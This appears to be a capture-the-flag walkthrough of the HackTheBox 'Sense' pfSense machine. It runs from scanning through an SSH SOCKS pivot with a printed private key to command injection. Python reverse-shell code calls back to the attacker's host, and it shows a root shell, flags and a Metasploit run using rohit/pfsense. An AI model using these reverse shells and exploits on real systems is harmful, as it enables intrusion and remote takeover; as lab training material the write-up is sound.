#### Sense

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [Getting banned](#getting-banned)
- [Pivot](#pivot)
- [Dynamic port forwarding and proxychain](#dynamic-port-forwarding-and-proxychain)
- [Command Injection](#command-injection)
- [Using Metasploit](#using-metasploit)
- [Python Login Brute Force](#python-login-brute-force)

###### Attacker Info

```sh
root@kali:~/Desktop# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.150.18/24 brd 192.168.150.255 scope global dynamic noprefixroute eth0
       valid_lft 85896sec preferred_lft 85896sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::345c:2c3c:7f05:411d/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/Desktop#
```

###### Nmap Scan

```sh
root@kali:~/sense# nmap -sC -sV -oA sense.nmap 10.10.10.60
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-25 14:41 EDT
Nmap scan report for 10.10.10.60
Host is up (0.18s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.65 seconds
root@kali:~/sense#
```

###### Web Enumeration

```
https://10.10.10.60/
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

![](images/4.png)

###### Getting banned

`ban-me.sh`

```sh
for i in $(seq 0 15);do

curl -i -s -k  -X $'POST' \
    -H $'Host: 10.10.10.60' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://10.10.10.60/index.php' -H $'Cookie: PHPSESSID=f3ee818d4bd987f6b62b88e71601414e; cookie_test=1529956217' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 121' \
    -b $'PHPSESSID=f3ee818d4bd987f6b62b88e71601414e; cookie_test=1529956217' \
    --data-binary $'__csrf_magic=sid%3A7e7ff1c3faf7cd9569fd1d6c15cfb2a519681d16%2C1529952617&usernamefld=test&passwordfld=testing&login=Login' \
    $'https://10.10.10.60/index.php'

echo $i
done
```

```sh
root@kali:~/sense# bash ban-me.sh
```

```sh
root@kali:~/sense# curl -k https://10.10.10.60
```

###### Pivot

```sh
root@kali:~/sense# cat falafet.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
root@kali:~/sense# chmod 600 falafet.key
root@kali:~/sense#
```

```sh
root@kali:~/sense# ssh -i falafet.key root@10.10.10.73
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Jun 25 21:56:26 2018 from 10.10.14.16
root@falafel:~# curl -k https://10.10.10.60

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
	<head>
		<script type="text/javascript" src="/javascript/jquery.js"></script>
		<script type="text/javascript">
		//<![CDATA[
		$(document).ready(function() { jQuery('#usernamefld').focus(); });
		//]]>
		</script>

		<title>Login</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
		<link rel="shortcut icon" href="/themes/pfsense_ng/images/icons/favicon.ico" />
				<link rel="stylesheet" type="text/css" href="/themes/pfsense_ng/login.css" media="all" />
				<script type="text/javascript">
		//<![CDATA[
			function page_load() {}
			function clearError() {
				if($('#inputerrors'))
				$('#inputerrors').html('');
			}

    var input_errors = '';
    jQuery(document).ready(init);

    var noAjaxOnSubmit = false;

    function init() {
      if(jQuery('#submit') && ! noAjaxOnSubmit) {
        // debugging helper
        //alert('adding observe event for submit button');

        jQuery("#submit").click(submit_form);
        jQuery('#submit').click(function() {return false;});
        var to_insert = "<div style='visibility:hidden' id='loading' name='loading'><img src='/themes/pfsense_ng/images/misc/loader.gif' alt='loader' \/><\/div>";
        jQuery('#submit').before(to_insert);
      }
    }

    function submit_form(e){
      // debugging helper
      //alert(Form.serialize($('iform')));

      if(jQuery('#inputerrors'))
        jQuery('#inputerrors').html('<center><b><i>Loading...<\/i><\/b><\/center>');

      /* dsh: Introduced because pkg_edit tries to set some hidden fields
       *      if executing submit's onclick event. The click gets deleted
       *      by Ajax. Hence using onkeydown instead.
       */
      if(jQuery('#submit').prop('keydown')) {
        jQuery('#submit').keydown();
        jQuery('#submit').css('visibility','hidden');
      }
      if(jQuery('#cancelbutton'))
        jQuery('#cancelbutton').css('visibility','hidden');
      jQuery('#loading').css('visibility','visible');
      // submit the form using Ajax
    }

    function formSubmitted(resp) {
      var responseText = resp.responseText;

      // debugging helper
      // alert(responseText);

      if(responseText.indexOf('html') > 0) {
        /* somehow we have been fed an html page! */
        //alert('Somehow we have been fed an html page! Forwarding to /.');
        document.location.href = '/';
      }

      eval(responseText);
    }

    /* this function will be called if an HTTP error will be triggered */
    function formFailure(resp) {
	    showajaxmessage(resp.responseText);
		if(jQuery('#submit'))
		  jQuery('#submit').css('visibility','visible');
		if(jQuery('#cancelbutton'))
		  jQuery('#cancelbutton').css('visibility','visible');
		if(jQuery('#loading'))
		  jQuery('#loading').css('visibility','hidden');

    }

    function showajaxmessage(message) {
      var message_html;

      if (message == '') {
        NiftyCheck();
        Rounded("div#redbox","all","#FFF","#990000","smooth");
        Rounded("td#blackbox","all","#FFF","#000000","smooth");

        if(jQuery('#submit'))
          jQuery('#submit').css('visibility','visible');
        if(jQuery('#cancelbutton'))
          jQuery('#cancelbutton').css('visibility','visible');
        if(jQuery('#loading'))
          jQuery('#loading').css('visibility','hidden');

        return;
      }

      message_html = '<table height="32" width="100%" summary="redbox"><tr><td>';
      message_html += '<div style="background-color:#990000" id="redbox">';
      message_html += '<table width="100%" summary="message"><tr><td width="8%">';
      message_html += '<img style="vertical-align:center" src="/themes/pfsense_ng/images/icons/icon_exclam.gif" width="28" height="32" alt="exclamation" \/>';
      message_html += '<\/td><td width="70%"><font color="white">';
      message_html += '<b>' + message + '<\/b><\/font><\/td>';

      if(message.indexOf('apply') > 0) {
        message_html += '<td>';
        message_html += '<input name="apply" type="submit" class="formbtn" id="apply" value="Apply changes" \/>';
        message_html += '<\/td>';
      }

      message_html += '<\/tr><\/table><\/div><\/td><\/table><br \/>';
      jQuery('#inputerrors').html(message_html);

      NiftyCheck();
      Rounded("div#redbox","all","#FFF","#990000","smooth");
      Rounded("td#blackbox","all","#FFF","#000000","smooth");

      if(jQuery('#submit'))
        jQuery('#submit').css('visibility','visible');
      if(jQuery('#cancelbutton'))
        jQuery('#cancelbutton').css('visibility','visible');
      if(jQuery('#loading'))
        jQuery('#loading').css('visibility','hidden');
      if(jQuery('#inputerrors'))
        window.scrollTo(0, 0);
    }
  		//]]>
		</script>
		<script type="text/javascript" src="/themes/pfsense_ng/javascript/niftyjsCode.js"></script>
	<script type="text/javascript">if (top != self) {top.location.href = self.location.href;}</script><script type="text/javascript">var csrfMagicToken = "sid:1f5afe254732bd7be33290a643a89efde4d693b4,1529953063;ip:d976c4d6cbb17509e1dd3a005b61c60f05b45474,1529953063";var csrfMagicName = "__csrf_magic";</script><script src="/csrf/csrf-magic.js" type="text/javascript"></script></head>
	<body onload="page_load()">
		<div id="login">
						<form id="iform" name="iform" method="post"  action="/index.php"><input type='hidden' name='__csrf_magic' value="sid:1f5afe254732bd7be33290a643a89efde4d693b4,1529953063;ip:d976c4d6cbb17509e1dd3a005b61c60f05b45474,1529953063" />
				<h1>&nbsp;</h1>
				<div id="inputerrors"></div>
				<p>
					<span style="text-align:left">
						Username:<br />
						<input onclick="clearError();" onchange="clearError();" id="usernamefld" type="text" name="usernamefld" class="formfld user" tabindex="1" />
					</span>
				</p>
				<p>
					<br />
					<span style="text-align:left">
						Password: <br />
						<input onclick="clearError();" onchange="clearError();" id="passwordfld" type="password" name="passwordfld" class="formfld pwd" tabindex="2" />
					</span>
				</p>
				<p>
					<br />
					<span style="text-align:center; font-weight: normal ; font-style: italic">
						Enter username and password to login.					</span>

									</p>
				<p>
					<span style="text-align:center">
						<input type="submit" name="login" class="formbtn" value="Login" tabindex="3" />
					</span>
				</p>
			</form>
		</div>
	<script type="text/javascript">CsrfMagic.end();</script></body>
</html>
root@falafel:~#
```

```sh
root@kali:~/sense# netstat -antp | grep 1080
```

###### Dynamic port forwarding and proxychain

```sh
root@kali:~/sense# ssh -D1080 root@10.10.10.73 -i falafet.key
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Jun 25 22:00:04 2018 from 10.10.14.16
root@falafel:~#
```

```sh
root@kali:~/sense# netstat -antp | grep 1080
tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      3322/ssh
tcp6       0      0 ::1:1080                :::*                    LISTEN      3322/ssh
root@kali:~/sense#
```

![](images/5.png)

![](images/6.png)

![](images/7.png)

![](images/8.png)

```sh
root@kali:~/sense# curl -k https://10.10.10.60
```

```sh
root@kali:~/sense# vim /etc/proxychains.conf
```

![](images/9.png)

```sh
root@kali:~/sense# proxychains curl -k https://10.10.10.60
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.60:443-<><>-OK

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
	<head>
		<script type="text/javascript" src="/javascript/jquery.js"></script>
		<script type="text/javascript">
		//<![CDATA[
		$(document).ready(function() { jQuery('#usernamefld').focus(); });
		//]]>
		</script>

		<title>Login</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
		<link rel="shortcut icon" href="/themes/pfsense_ng/images/icons/favicon.ico" />
				<link rel="stylesheet" type="text/css" href="/themes/pfsense_ng/login.css" media="all" />
				<script type="text/javascript">
		//<![CDATA[
			function page_load() {}
			function clearError() {
				if($('#inputerrors'))
				$('#inputerrors').html('');
			}

    var input_errors = '';
    jQuery(document).ready(init);

    var noAjaxOnSubmit = false;

    function init() {
      if(jQuery('#submit') && ! noAjaxOnSubmit) {
        // debugging helper
        //alert('adding observe event for submit button');

        jQuery("#submit").click(submit_form);
        jQuery('#submit').click(function() {return false;});
        var to_insert = "<div style='visibility:hidden' id='loading' name='loading'><img src='/themes/pfsense_ng/images/misc/loader.gif' alt='loader' \/><\/div>";
        jQuery('#submit').before(to_insert);
      }
    }

    function submit_form(e){
      // debugging helper
      //alert(Form.serialize($('iform')));

      if(jQuery('#inputerrors'))
        jQuery('#inputerrors').html('<center><b><i>Loading...<\/i><\/b><\/center>');

      /* dsh: Introduced because pkg_edit tries to set some hidden fields
       *      if executing submit's onclick event. The click gets deleted
       *      by Ajax. Hence using onkeydown instead.
       */
      if(jQuery('#submit').prop('keydown')) {
        jQuery('#submit').keydown();
        jQuery('#submit').css('visibility','hidden');
      }
      if(jQuery('#cancelbutton'))
        jQuery('#cancelbutton').css('visibility','hidden');
      jQuery('#loading').css('visibility','visible');
      // submit the form using Ajax
    }

    function formSubmitted(resp) {
      var responseText = resp.responseText;

      // debugging helper
      // alert(responseText);

      if(responseText.indexOf('html') > 0) {
        /* somehow we have been fed an html page! */
        //alert('Somehow we have been fed an html page! Forwarding to /.');
        document.location.href = '/';
      }

      eval(responseText);
    }

    /* this function will be called if an HTTP error will be triggered */
    function formFailure(resp) {
	    showajaxmessage(resp.responseText);
		if(jQuery('#submit'))
		  jQuery('#submit').css('visibility','visible');
		if(jQuery('#cancelbutton'))
		  jQuery('#cancelbutton').css('visibility','visible');
		if(jQuery('#loading'))
		  jQuery('#loading').css('visibility','hidden');

    }

    function showajaxmessage(message) {
      var message_html;

      if (message == '') {
        NiftyCheck();
        Rounded("div#redbox","all","#FFF","#990000","smooth");
        Rounded("td#blackbox","all","#FFF","#000000","smooth");

        if(jQuery('#submit'))
          jQuery('#submit').css('visibility','visible');
        if(jQuery('#cancelbutton'))
          jQuery('#cancelbutton').css('visibility','visible');
        if(jQuery('#loading'))
          jQuery('#loading').css('visibility','hidden');

        return;
      }

      message_html = '<table height="32" width="100%" summary="redbox"><tr><td>';
      message_html += '<div style="background-color:#990000" id="redbox">';
      message_html += '<table width="100%" summary="message"><tr><td width="8%">';
      message_html += '<img style="vertical-align:center" src="/themes/pfsense_ng/images/icons/icon_exclam.gif" width="28" height="32" alt="exclamation" \/>';
      message_html += '<\/td><td width="70%"><font color="white">';
      message_html += '<b>' + message + '<\/b><\/font><\/td>';

      if(message.indexOf('apply') > 0) {
        message_html += '<td>';
        message_html += '<input name="apply" type="submit" class="formbtn" id="apply" value="Apply changes" \/>';
        message_html += '<\/td>';
      }

      message_html += '<\/tr><\/table><\/div><\/td><\/table><br \/>';
      jQuery('#inputerrors').html(message_html);

      NiftyCheck();
      Rounded("div#redbox","all","#FFF","#990000","smooth");
      Rounded("td#blackbox","all","#FFF","#000000","smooth");

      if(jQuery('#submit'))
        jQuery('#submit').css('visibility','visible');
      if(jQuery('#cancelbutton'))
        jQuery('#cancelbutton').css('visibility','visible');
      if(jQuery('#loading'))
        jQuery('#loading').css('visibility','hidden');
      if(jQuery('#inputerrors'))
        window.scrollTo(0, 0);
    }
  		//]]>
		</script>
		<script type="text/javascript" src="/themes/pfsense_ng/javascript/niftyjsCode.js"></script>
	<script type="text/javascript">if (top != self) {top.location.href = self.location.href;}</script><script type="text/javascript">var csrfMagicToken = "sid:650bb87caed2ae65efb4eaabf0922df92d00da13,1529953525;ip:0ee8d49c4983df139145a66543ce9c70cb41ef5f,1529953525";var csrfMagicName = "__csrf_magic";</script><script src="/csrf/csrf-magic.js" type="text/javascript"></script></head>
	<body onload="page_load()">
		<div id="login">
						<form id="iform" name="iform" method="post"  action="/index.php"><input type='hidden' name='__csrf_magic' value="sid:650bb87caed2ae65efb4eaabf0922df92d00da13,1529953525;ip:0ee8d49c4983df139145a66543ce9c70cb41ef5f,1529953525" />
				<h1>&nbsp;</h1>
				<div id="inputerrors"></div>
				<p>
					<span style="text-align:left">
						Username:<br />
						<input onclick="clearError();" onchange="clearError();" id="usernamefld" type="text" name="usernamefld" class="formfld user" tabindex="1" />
					</span>
				</p>
				<p>
					<br />
					<span style="text-align:left">
						Password: <br />
						<input onclick="clearError();" onchange="clearError();" id="passwordfld" type="password" name="passwordfld" class="formfld pwd" tabindex="2" />
					</span>
				</p>
				<p>
					<br />
					<span style="text-align:center; font-weight: normal ; font-style: italic">
						Enter username and password to login.					</span>

									</p>
				<p>
					<span style="text-align:center">
						<input type="submit" name="login" class="formbtn" value="Login" tabindex="3" />
					</span>
				</p>
			</form>
		</div>
	<script type="text/javascript">CsrfMagic.end();</script></body>
</html>
root@kali:~/sense#
```

![](images/14.png)

![](images/15.png)

```
https://10.10.10.60/changelog.txt
```

![](images/10.png)

```
https://10.10.10.60/system-users.txt
```

![](images/11.png)

![](images/12.png)

![](images/13.png)

###### Command Injection

[`Pfsense Vulns`](https://www.cvedetails.com/vulnerability-list/vendor_id-11749/product_id-21763/Pfsense-Pfsense.html)

![](images/16.png)

[`PfSense Vulnerabilities Part 2: Command Injection`](https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/) &rarr; `Command Injection in status_rrd_graph_img.php`

![](images/17.png)

![](images/18.png)

![](images/19.png)

![](images/20.png)

![](images/21.png)

![](images/22.png)

![](images/23.png)

![](images/24.png)

![](images/25.png)

![](images/26.png)

![](images/27.png)

![](images/28.png)

```sh
root@kali:~/sense# nc -nlvp 9001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.60.
Ncat: Connection from 10.10.10.60:28978.
```

![](images/29.png)

```sh
root@kali:~/sense# nc -nlvp 9001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.60.
Ncat: Connection from 10.10.10.60:8429.
kanishka
root@kali:~/sense#
```

![](images/30.png)

```sh
root@kali:~/sense# nc -nlvp 9001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.60.
Ncat: Connection from 10.10.10.60:57195.
uid=0(root) gid=0(wheel) groups=0(wheel)
root@kali:~/sense#
```

![](images/31.png)

```sh
root@kali:~/sense# nc -nlvp 9001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.60.
Ncat: Connection from 10.10.10.60:3177.
pfSense.localdomain
root@kali:~/sense#
```

[`Reverse Shell Cheat Sheet`](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```sh
root@kali:~/sense# cat cmd
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.16",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
root@kali:~/sense#
```

![](images/32.png)

![](images/33.png)

```sh
root@kali:~/sense# nc -nlvp 9001 < cmd
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.60.
Ncat: Connection from 10.10.10.60:12641.
pfSense.localdomain
root@kali:~/sense#
```

```sh
root@kali:~/sense# nc -nlvp 1234
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.60.
Ncat: Connection from 10.10.10.60:20408.
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# cd /root
# ls
.cshrc
.first_time
.gitsync_merge.sample
.hushlogin
.login
.part_mount
.profile
.shrc
.tcshrc
root.txt
# cat root.txt
d08c32a5d4f8c8b10e76eb51a69f1a86
# cd /usr
# ls
bin
lib
lib32
libexec
local
obj
pbi
sbin
share
# cd /home
# ls
.snap
rohit
# cd rohit
# ls
.tcshrc
user.txt
# cat user.txt
8721327cc232073b40d27d9c17e7348b
#
```

###### Using Metasploit

```sh
root@kali:~/sense# service postgresql start
root@kali:~/sense# msfconsole

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v4.16.61-dev                         ]
+ -- --=[ 1773 exploits - 1011 auxiliary - 307 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search pfsense

Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   exploit/unix/http/pfsense_clickjacking          2017-11-21       normal     Clickjacking Vulnerability In CSRF Error Page pfSense
   exploit/unix/http/pfsense_graph_injection_exec  2016-04-18       excellent  pfSense authenticated graph status RCE
   exploit/unix/http/pfsense_group_member_exec     2017-11-06       excellent  pfSense authenticated group member RCE


msf > use exploit/unix/http/pfsense_graph_injection_exec
msf exploit(unix/http/pfsense_graph_injection_exec) > show advanced

Module advanced options (exploit/unix/http/pfsense_graph_injection_exec):

   Name                    Current Setting                                     Required  Description
   ----                    ---------------                                     --------  -----------
   ContextInformationFile                                                      no        The information file that contains context information
   DOMAIN                  WORKSTATION                                         yes       The domain to use for windows authentification
   DigestAuthIIS           true                                                no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers
   DisablePayloadHandler   false                                               no        Disable the handler code for the selected payload
   EnableContextEncoding   false                                               no        Use transient context when encoding payloads
   FileDropperDelay                                                            no        Delay in seconds before attempting cleanup
   FingerprintCheck        true                                                no        Conduct a pre-exploit fingerprint verification
   HttpClientTimeout                                                           no        HTTP connection and receive timeout
   HttpPassword                                                                no        The HTTP password to specify for authentication
   HttpTrace               false                                               no        Show the raw HTTP requests and responses
   HttpUsername                                                                no        The HTTP username to specify for authentication
   SSLVersion              Auto                                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   UserAgent               Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  no        The User-Agent header to use for all requests
   VERBOSE                 false                                               no        Enable detailed status messages
   WORKSPACE                                                                   no        Specify the workspace for this module
   WfsDelay                0                                                   no        Additional delay when waiting for a session


Payload advanced options (php/meterpreter/reverse_tcp):

   Name                         Current Setting  Required  Description
   ----                         ---------------  --------  -----------
   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
   AutoRunScript                                 no        A script to run automatically on session creation.
   AutoSystemInfo               true             yes       Automatically capture system information on initialization.
   AutoVerifySession            true             yes       Automatically verify and drop invalid sessions
   AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
   EnableStageEncoding          false            no        Encode the second stage payload
   EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
   HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
   InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
   PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
   PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
   PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
   PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
   PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
   ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
   ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
   ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
   ReverseListenerComm                           no        The specific communication channel to use for this listener
   ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
   SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
   SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
   SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
   SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
   StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
   StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
   StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
   StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
   StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
   VERBOSE                      false            no        Enable detailed status messages
   WORKSPACE                                     no        Specify the workspace for this module

msf exploit(unix/http/pfsense_graph_injection_exec) > set RHOST 10.10.10.60
RHOST => 10.10.10.60
msf exploit(unix/http/pfsense_graph_injection_exec) > set LHOST 1080
LHOST => 1080
msf exploit(unix/http/pfsense_graph_injection_exec) > set USERNAME rohit
USERNAME => rohit
msf exploit(unix/http/pfsense_graph_injection_exec) > set PASSWORD pfsense
PASSWORD => pfsense
msf exploit(unix/http/pfsense_graph_injection_exec) > set Proxies socks5:127.0.0.1:1080
Proxies => socks5:127.0.0.1:1080
msf exploit(unix/http/pfsense_graph_injection_exec) > set ReverseAllowProxy true
ReverseAllowProxy => true
msf exploit(unix/http/pfsense_graph_injection_exec) > set LHOST tun0
LHOST => 10.10.14.16
msf exploit(unix/http/pfsense_graph_injection_exec) > show options

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting        Required  Description
   ----      ---------------        --------  -----------
   PASSWORD  pfsense                yes       Password to login with
   Proxies   socks5:127.0.0.1:1080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST     10.10.10.60            yes       The target address
   RPORT     443                    yes       The target port (TCP)
   SSL       true                   no        Negotiate SSL/TLS for outgoing connections
   USERNAME  rohit                  yes       User to login with
   VHOST                            no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.16      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unix/http/pfsense_graph_injection_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.16:4444
